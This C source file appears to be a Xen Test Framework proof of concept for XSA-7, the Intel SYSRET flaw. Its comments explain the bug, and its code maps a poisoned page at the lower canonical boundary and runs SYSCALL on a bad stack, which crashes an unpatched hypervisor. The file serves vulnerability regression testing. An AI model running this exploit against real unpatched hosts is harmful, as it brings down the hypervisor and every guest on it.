/**
 * @file tests/xsa-7/main.c
 * @ref test-xsa-7
 *
 * @page test-xsa-7 XSA-7
 *
 * Advisory:
 * [XSA-7](https://lore.kernel.org/xen-devel/20439.12248.291249.667993@mariner.uk.xensource.com/)
 *
 * # Background
 *
 * Intel and AMD CPUs implement the SYSRET instruction differently.  Relevant
 * to XSA-7 is the order of changing privilege and the canonical check on
 * @%rip.
 *
 * In x86_64 with 4-level paging, 0x0000800000000000 is a non-canonical
 * address but a legal state for @%rip, which can occur by executing an
 * instruction which ends on the lower canonical boundary.  This state should
 * yield @#GP[0] for a bad instruction fetch, reporting the non-canonical
 * regs->rip.
 *
 * Exceptions taken in CPL0 push onto the current stack (IST vectors can
 * change stack, but @#GP is never typically IST), while exceptions at lower
 * privilege perform a normal privilege change including stack switch back to
 * CPL0.  At the SYSCALL entry and SYSRET exit points, @%rsp is the user
 * stack, not the kernel stack.
 *
 * For the SYSRET instruction, at the time of writing (July 2025) AMD don't
 * explicitly identify where the @%rip canonical check is performed, but have
 * stated that it is after switching to CPL3.  Therefore, AMD CPUs are not
 * vulnerable.
 *
 * The Intel SDM pseudocode for SYSRET does show the @%rip canonical check
 * being performed early and while in CPL0, and experimentation confirms that
 * Intel CPUs are vulnerable.  The recommended fix is to fall back to using
 * IRET in this case.  IRET takes @#GP[0] for a non-canonical @%rip in CPL0,
 * but does so on a kernel stack, so can handle the fault safely.
 *
 * P.S.  Unrelated to XSA-7, but if an attacker can clear MSR_EFER.SCE, the
 * resulting @#UD from SYSRET can be used in the same way.
 *
 *
 * # PoC
 *
 * Crashing a vulnerable Xen is easy.  Like @ref test-xsa-260, causing Xen to
 * use a non-canonical stack will escalate to @#DF.
 *
 * However, on a mitigated Xen the resulting @#GP needs handing back to the
 * guest.  If the guest stack is bad, pushing the exception frame will fail
 * and the guest will be crashed, preventing a clean status report.
 *
 * Instead, use a good @%rsp in the same frame that holds the SYSCALL for the
 * attack run.  If Xen has SMAP, there will be a clean @#DF (64bit PV guests
 * are always CPL3, so use _PAGE_USER mappings).

 * If SMAP isn't active, Xen's @#GP handler will run on the provided stack,
 * including the top-of-stack block.  To force a crash, poison the rest of the
 * page with `0xcc`, notably covering the `current` and `__per_cpu_offset`
 * top-of-stack fields, causing recursive @#GP faults.  Eventually, Xen runs
 * off the bottom of the stack, finds an unmapped page, and escalates to a
 * clean @#DF, which does notice that it's on the wrong stack.
 *
 * A mitigated Xen will not run on the provided stack, but will deliver the
 * @#GP back to us on it.  Almost 4k is plenty of space to handle the fault
 * and recover.
 *
 * @see tests/xsa-7/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-7 PoC";

void stub(void);

/*
 * A page to be mapped at the lower canonical boundary.  The attack needs a
 * SYSCALL instruction at the end.  The rest may be used as a stack by Xen,
 * including a top-of-stack block.  Poison with 0xcc to to make the pointers
 * in the top-of-stack block be non-canonical.
 */
asm (".align 4096;"
     ".skip 4096 - (.L_page_end - stub), 0xcc;"

     "stub: "
     "    syscall;"
     ".L_page_end:"

     _ASM_EXTABLE_HANDLER(0x0000800000000000, .L_stub_done, ex_gp)
    );

bool ex_gp(struct cpu_regs *regs, const struct extable_entry *ex)
{
    if ( regs->entry_vector == X86_EXC_GP && regs->error_code == 0 )
    {
        regs->_rsp = regs->rdx; /* Restore %rsp from the xchg */
        regs->ip = ex->fixup;

        return true;
    }

    return false;
}

void test_main(void)
{
    static intpte_t l3t[L1_PT_ENTRIES] __page_aligned_bss;
    static intpte_t l2t[L2_PT_ENTRIES] __page_aligned_bss;
    static intpte_t l1t[L3_PT_ENTRIES] __page_aligned_bss;

    intpte_t *l4t = _p(pv_start_info->pt_base);
    int rc;

    /* Map the page containing stub_fn at the lower canonical boundary. */
    l1t[511] = pte_from_virt(stub, PF_SYM(AD, RW, P));
    l2t[511] = pte_from_virt(l1t,  PF_SYM(AD, RW, P));
    l3t[511] = pte_from_virt(l2t,  PF_SYM(AD, RW, P));

    if ( hypercall_update_va_mapping(
             _u(l1t), pte_from_virt(l1t, PF_SYM(AD, P)), 0) )
        return xtf_error("Error: Can't remap l1t as R/O\n");
    if ( hypercall_update_va_mapping(
             _u(l2t), pte_from_virt(l2t, PF_SYM(AD, P)), 0) )
        return xtf_error("Error: Can't remap l2t as R/O\n");
    if ( hypercall_update_va_mapping(
             _u(l3t), pte_from_virt(l3t, PF_SYM(AD, P)), 0) )
        return xtf_error("Error: Can't remap l3t as R/O\n");

    mmu_update_t mu[] = {
        {
            .ptr = virt_to_maddr(&l4t[255]),
            .val = pte_from_virt(l3t, PF_SYM(AD, RW, P)),
        },
    };

    rc = hypercall_mmu_update(mu, ARRAY_SIZE(mu), NULL, DOMID_SELF);
    if ( rc )
        return xtf_error("Error: mapping buffer failed: %d\n", rc);

    /*
     * The attack run uses SYSCALL, so executes one hypercall before getting
     * into trouble.  Use XENVER_version for speed and to avoid side effects.
     *
     * Load the bad stack by XCHG-ing %rsp, so ex_gp() can recover the good
     * stack.  Then jump to stub()'s alias beside the low canonincal boundary.
     */
    register unsigned long r11 asm ("r11");
    unsigned long tmp;
    asm volatile (
        "    xchg %[stk], %%rsp;"
        "    jmp *%[stub];"
        ".L_stub_done:"
        : "=a" (tmp), "=D" (tmp), "=S" (tmp), /* Hypercall clobbers */
          "=c" (tmp), "=r" (r11),             /* SYSCALL clobbers */
          [stk] "=&d" (tmp)                   /* XCHG clobber */
        : "a" (__HYPERVISOR_xen_version),
          "D" (XENVER_version),
          "S" (NULL),
          [stub] "r" (_p(0x00007ffffffff000ULL) + (_u(stub) & ~PAGE_MASK)),
          "[stk]" (0x00007fffffffff00UL)
        );

    /*
     * If we're still alive, Xen didn't crash, and ex_gp() (registered by the
     * non-canonical %rip) did trigger and fix up properly.
     */
    xtf_success("Success: Not vulnerble to XSA-7\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
